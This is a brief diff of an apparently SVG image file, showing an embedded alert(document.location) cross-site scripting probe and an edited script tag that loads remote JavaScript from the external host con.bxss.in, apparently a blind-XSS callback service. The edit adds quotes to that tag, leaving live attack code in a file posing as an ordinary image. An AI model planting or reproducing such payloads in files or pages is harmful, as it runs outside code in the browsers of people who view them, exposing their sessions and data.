@@ -11,7 +11,7 @@
       alert(document.location);
    </script>
 
-<script src=https://con.bxss.in></script>
+<script src="https://con.bxss.in"></script>
   <!-- Username label -->
   <text x="30" y="110" font-family="Arial" font-size="14" fill="#555">
     Username
